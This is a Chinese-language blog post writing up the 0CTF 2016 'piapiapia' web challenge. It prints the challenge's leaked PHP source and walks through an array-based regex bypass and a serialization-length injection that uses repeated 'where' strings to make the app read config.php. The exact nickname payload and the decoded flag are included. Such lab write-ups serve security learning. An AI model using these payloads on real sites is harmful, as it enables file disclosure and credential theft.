@@ -1,0 +1,474 @@
+---
+layout: post
+title:  "2019-11-28-02"
+description: 前所未有
+date:   2019-11-28-02
+tags: 序列化与反序列化 网站文件泄露扫描 绕过waf php
+excerpt_separator: ~~~
+---
+1.数组绕过正则及相关
+```
+md5(Array()) = null
+sha1(Array()) = null
+ereg(pattern,Array()) =null
+preg_match(pattern,Array()) = false
+strcmp(Array(), “abc”) =null
+strpos(Array(),“abc”) = null
+strlen(Array()) = null
+```
+2.改变序列化长度，导致反序列化漏洞
+
+3.出现file_get_contents()函数(而且我发现一般有这个函数的同时，都会有序列化的事情)
+
+4.扫描网站目录,是否存在源码泄露(+2)
+
+5.用bp抓包把变量nickname改成数组(nickname[])即可
+
+~~~
+一个很可爱的登录界面：
+
+![My helpful screenshot](/assets/img/2019-11-28-02/1.png)
+
+## 扫描网站目录,是否存在源码泄露,多次扫描!!!!
+
+![My helpful screenshot](/assets/img/2019-11-28-02/4.png)
+
+进行一下目录扫描，发现源码泄露www.zip，把源码给出：
+
+index.php
+```php
+<?php
+	require_once('class.php');
+	if($_SESSION['username']) {
+		header('Location: profile.php');
+		exit;
+	}
+	if($_POST['username'] && $_POST['password']) {
+		$username = $_POST['username'];
+		$password = $_POST['password'];
+
+		if(strlen($username) < 3 or strlen($username) > 16) 
+			die('Invalid user name');
+
+		if(strlen($password) < 3 or strlen($password) > 16) 
+			die('Invalid password');
+
+		if($user->login($username, $password)) {
+			$_SESSION['username'] = $username;
+			header('Location: profile.php');
+			exit;	
+		}
+		else {
+			die('Invalid user name or password');
+		}
+	}
+	else {
+?>
+<!DOCTYPE html>
+<html>
+<head>
+   <title>Login</title>
+   <link href="static/bootstrap.min.css" rel="stylesheet">
+   <script src="static/jquery.min.js"></script>
+   <script src="static/bootstrap.min.js"></script>
+</head>
+<body>
+	<div class="container" style="margin-top:100px">  
+		<form action="index.php" method="post" class="well" style="width:220px;margin:0px auto;"> 
+			<img src="static/piapiapia.gif" class="img-memeda " style="width:180px;margin:0px auto;">
+			<h3>Login</h3>
+			<label>Username:</label>
+			<input type="text" name="username" style="height:30px"class="span3"/>
+			<label>Password:</label>
+			<input type="password" name="password" style="height:30px" class="span3">
+
+			<button type="submit" class="btn btn-primary">LOGIN</button>
+		</form>
+	</div>
+</body>
+</html>
+<?php
+	}
+?>
+```
+在输入账号密码之后进入了profile.php，下面是profile.php的源码：
+```php
+<?php
+	require_once('class.php');
+	if($_SESSION['username'] == null) {
+		die('Login First');	
+	}
+	$username = $_SESSION['username'];
+	$profile=$user->show_profile($username);
+	if($profile  == null) {
+		header('Location: update.php');
+	}
+	else {
+		$profile = unserialize($profile);
+		$phone = $profile['phone'];
+		$email = $profile['email'];
+		$nickname = $profile['nickname'];
+		$photo = base64_encode(file_get_contents($profile['photo']));
+?>
+<!DOCTYPE html>
+<html>
+<head>
+   <title>Profile</title>
+   <link href="static/bootstrap.min.css" rel="stylesheet">
+   <script src="static/jquery.min.js"></script>
+   <script src="static/bootstrap.min.js"></script>
+</head>
+<body>
+	<div class="container" style="margin-top:100px">  
+		<img src="data:image/gif;base64,<?php echo $photo; ?>" class="img-memeda " style="width:180px;margin:0px auto;">
+		<h3>Hi <?php echo $nickname;?></h3>
+		<label>Phone: <?php echo $phone;?></label>
+		<label>Email: <?php echo $email;?></label>
+	</div>
+</body>
+</html>
+<?php
+	}
+?>
+```
+还有注册页面的源码(没有太大用)，register.php：
+```php
+<?php
+	require_once('class.php');
+	if($_POST['username'] && $_POST['password']) {
+		$username = $_POST['username'];
+		$password = $_POST['password'];
+
+		if(strlen($username) < 3 or strlen($username) > 16) 
+			die('Invalid user name');
+
+		if(strlen($password) < 3 or strlen($password) > 16) 
+			die('Invalid password');
+		if(!$user->is_exists($username)) {
+			$user->register($username, $password);
+			echo 'Register OK!<a href="index.php">Please Login</a>';		
+		}
+		else {
+			die('User name Already Exists');
+		}
+	}
+	else {
+?>
+<!DOCTYPE html>
+<html>
+<head>
+   <title>Login</title>
+   <link href="static/bootstrap.min.css" rel="stylesheet">
+   <script src="static/jquery.min.js"></script>
+   <script src="static/bootstrap.min.js"></script>
+</head>
+<body>
+	<div class="container" style="margin-top:100px">  
+		<form action="register.php" method="post" class="well" style="width:220px;margin:0px auto;"> 
+			<img src="static/piapiapia.gif" class="img-memeda " style="width:180px;margin:0px auto;">
+			<h3>Register</h3>
+			<label>Username:</label>
+			<input type="text" name="username" style="height:30px"class="span3"/>
+			<label>Password:</label>
+			<input type="password" name="password" style="height:30px" class="span3">
+
+			<button type="submit" class="btn btn-primary">REGISTER</button>
+		</form>
+	</div>
+</body>
+</html>
+<?php
+	}
+?>
+```
+然后是update.php：
+```php
+<?php
+	require_once('class.php');
+	if($_SESSION['username'] == null) {
+		die('Login First');	
+	}
+	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {
+
+		$username = $_SESSION['username'];
+		if(!preg_match('/^\d{11}$/', $_POST['phone']))
+			die('Invalid phone');
+
+		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
+			die('Invalid email');
+		
+		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
+			die('Invalid nickname');
+
+		$file = $_FILES['photo'];
+		if($file['size'] < 5 or $file['size'] > 1000000)
+			die('Photo size error');
+
+		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
+		$profile['phone'] = $_POST['phone'];
+		$profile['email'] = $_POST['email'];
+		$profile['nickname'] = $_POST['nickname'];
+		$profile['photo'] = 'upload/' . md5($file['name']);
+
+		$user->update_profile($username, serialize($profile));
+		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
+	}
+	else {
+?>
+<!DOCTYPE html>
+<html>
+<head>
+   <title>UPDATE</title>
+   <link href="static/bootstrap.min.css" rel="stylesheet">
+   <script src="static/jquery.min.js"></script>
+   <script src="static/bootstrap.min.js"></script>
+</head>
+<body>
+	<div class="container" style="margin-top:100px">  
+		<form action="update.php" method="post" enctype="multipart/form-data" class="well" style="width:220px;margin:0px auto;"> 
+			<img src="static/piapiapia.gif" class="img-memeda " style="width:180px;margin:0px auto;">
+			<h3>Please Update Your Profile</h3>
+			<label>Phone:</label>
+			<input type="text" name="phone" style="height:30px"class="span3"/>
+			<label>Email:</label>
+			<input type="text" name="email" style="height:30px"class="span3"/>
+			<label>Nickname:</label>
+			<input type="text" name="nickname" style="height:30px" class="span3">
+			<label for="file">Photo:</label>
+			<input type="file" name="photo" style="height:30px"class="span3"/>
+			<button type="submit" class="btn btn-primary">UPDATE</button>
+		</form>
+	</div>
+</body>
+</html>
+<?php
+	}
+?>
+```
+核心的处理代码，class.php：
+```php
+<?php
+require('config.php');
+
+class user extends mysql{
+	private $table = 'users';
+
+	public function is_exists($username) {
+		$username = parent::filter($username);
+
+		$where = "username = '$username'";
+		return parent::select($this->table, $where);
+	}
+	public function register($username, $password) {
+		$username = parent::filter($username);
+		$password = parent::filter($password);
+
+		$key_list = Array('username', 'password');
+		$value_list = Array($username, md5($password));
+		return parent::insert($this->table, $key_list, $value_list);
+	}
+	public function login($username, $password) {
+		$username = parent::filter($username);
+		$password = parent::filter($password);
+
+		$where = "username = '$username'";
+		$object = parent::select($this->table, $where);
+		if ($object && $object->password === md5($password)) {
+			return true;
+		} else {
+			return false;
+		}
+	}
+	public function show_profile($username) {
+		$username = parent::filter($username);
+
+		$where = "username = '$username'";
+		$object = parent::select($this->table, $where);
+		return $object->profile;
+	}
+	public function update_profile($username, $new_profile) {
+		$username = parent::filter($username);
+		$new_profile = parent::filter($new_profile);
+
+		$where = "username = '$username'";
+		return parent::update($this->table, 'profile', $new_profile, $where);
+	}
+	public function __tostring() {
+		return __class__;
+	}
+}
+
+class mysql {
+	private $link = null;
+
+	public function connect($config) {
+		$this->link = mysql_connect(
+			$config['hostname'],
+			$config['username'], 
+			$config['password']
+		);
+		mysql_select_db($config['database']);
+		mysql_query("SET sql_mode='strict_all_tables'");
+
+		return $this->link;
+	}
+
+	public function select($table, $where, $ret = '*') {
+		$sql = "SELECT $ret FROM $table WHERE $where";
+		$result = mysql_query($sql, $this->link);
+		return mysql_fetch_object($result);
+	}
+
+	public function insert($table, $key_list, $value_list) {
+		$key = implode(',', $key_list);
+		$value = '\'' . implode('\',\'', $value_list) . '\''; 
+		$sql = "INSERT INTO $table ($key) VALUES ($value)";
+		return mysql_query($sql);
+	}
+
+	public function update($table, $key, $value, $where) {
+		$sql = "UPDATE $table SET $key = '$value' WHERE $where";
+		return mysql_query($sql);
+	}
+
+	public function filter($string) {
+		$escape = array('\'', '\\\\');
+		$escape = '/' . implode('|', $escape) . '/';
+		$string = preg_replace($escape, '_', $string);
+
+		$safe = array('select', 'insert', 'update', 'delete', 'where');
+		$safe = '/' . implode('|', $safe) . '/i';
+		return preg_replace($safe, 'hacker', $string);
+	}
+	public function __tostring() {
+		return __class__;
+	}
+}
+session_start();
+$user = new user();
+$user->connect($config);
+```
+最后是config.php：
+```php
+<?php
+	$config['hostname'] = '127.0.0.1';
+	$config['username'] = 'root';
+	$config['password'] = '';
+	$config['database'] = '';
+	$flag = '';
+?>
+```
+看来flag就是在config.php中了，要想办法拿到config.php的内容了。
+
+然后就是代码审计了。
+
+这个地方貌似有个文件读取的地方，在profile.php中：
+```php
+else {
+		$profile = unserialize($profile);
+		$phone = $profile['phone'];
+		$email = $profile['email'];
+		$nickname = $profile['nickname'];
+		$photo = base64_encode(file_get_contents($profile['photo']));
+?>
+```
+上面还有个反序列化unserialize，感觉有戏，如果$profile[‘photo’]是config.php就可以读取到了，可以对photo进行操作的地方在update.php，有phone、email、nickname和photo这几个
+```php
+$profile = a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"ss@q.com";s:8:"nickname";s:8:"sea_sand";s:5:"photo";s:10:"config.php";}s:39:"upload/804f743824c0451b2f60d81b63b6a900";}
+print_r(unserialize($profile));
+
+结果如下：
+Array
+(
+    [phone] => 12345678901
+    [email] => ss@q.com
+    [nickname] => sea_sand
+    [photo] => config.php
+)
+```
+可以看到反序列化之后，最后面upload这一部分就没了，下面就是想办法把config.php塞进去了。
+
+从数组顺序上看是和上面数组的顺序一样的，可以抓个包看下post顺序，那么最有可能的就是从nickname下手了。
+
+在设置了$profile之后，用update_profile()函数进行处理：
+```php
+	public function update_profile($username, $new_profile) {
+		$username = parent::filter($username);
+		$new_profile = parent::filter($new_profile);
+
+		$where = "username = '$username'";
+		return parent::update($this->table, 'profile', $new_profile, $where);
+	}
+```
+进行了过滤：
+```php
+public function filter($string) {
+		$escape = array('\'', '\\\\');
+		$escape = '/' . implode('|', $escape) . '/';
+		$string = preg_replace($escape, '_', $string);
+
+		$safe = array('select', 'insert', 'update', 'delete', 'where');
+		$safe = '/' . implode('|', $safe) . '/i';
+		return preg_replace($safe, 'hacker', $string);
+	}
+```
+有两个正则过滤，带上输入nickname时候有一个正则，总共三个过滤的地方，首先要绕过第一个输入时候的正则：
+```php
+if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
+			die('Invalid nickname');
+数组即可绕过：
+nickname[]=
+
+那么$profile就是这样了：
+$profile = a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"ss@q.com";s:8:"nickname";a:1:{i:0;s:3:"xxx"};s:5:"photo";s:10:"config.php";}s:39:"upload/804f743824c0451b2f60d81b63b6a900";}
+```
+后面的正则要怎么利用呢，可以看到如果我们输入的有where，会替换成hacker，这样的话长度就变了，序列化后的每个变量都是有长度的，那么反序列化会怎么处理呢？我们应该怎么构造呢？
+
+抓包时,将nickname改为nickname[]
+
+数组绕过了第一个正则过滤之后，如果nickname最后面塞上";}s:5:“photo”;s:10:“config.php”;}，一共是34个字符，如果利用正则替换34个where，不就可以把这34个给挤出去，后面的upload因为序列化串被我们闭合了也就没用了：
+```php
+nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
+
+$profile = a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"ss@q.com";s:8:"nickname";a:1:{i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"};s:5:"photo";s:10:"config.php";}s:39:"upload/804f743824c0451b2f60d81b63b6a900";}
+```
+在where被正则匹配换成hacker之后，正好满足长度，然后后面的"};s:5:“photo”;s:10:“config.php”;}也就不是nickname的一部分了，被反序列化的时候就会被当成photo，就可以读取到config.php的内容了。
+
+下面开始操作：
+注册之后登陆，进入到update.php页面，输入信息及上传图片，用bp抓包把nickname改成数组即可：
+
+![My helpful screenshot](/assets/img/2019-11-28-02/2.png)
+
+![My helpful screenshot](/assets/img/2019-11-28-02/3.png)
+
+然后进入到profile中查看图片信息，把base64码解码：
+```
+PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFnezBjdGZfMjAxNl91bnNlcmlhbGl6ZV9pc192ZXJ5X2dvb2QhfSc7Cj8+Cg==
+
+解码得到：
+<?php
+$config['hostname'] = '127.0.0.1';
+$config['username'] = 'root';
+$config['password'] = 'qwertyuiop';
+$config['database'] = 'challenges';
+$flag = 'flag{0ctf_2016_unserialize_is_very_good!}';
+?>
+```
+## 知识点:
+1.数组绕过正则及相关
+```
+md5(Array()) = null
+sha1(Array()) = null
+ereg(pattern,Array()) =null
+preg_match(pattern,Array()) = false
+strcmp(Array(), “abc”) =null
+strpos(Array(),“abc”) = null
+strlen(Array()) = null
+```
+2.改变序列化长度，导致反序列化漏洞
+
+3.出现file_get_contents()函数(而且我发现一般有这个函数的同时，都会有序列化的事情)
+
+4.扫描网站目录,是否存在源码泄露(+2)
+
+5.用bp抓包把变量nickname改成数组(nickname[])即可
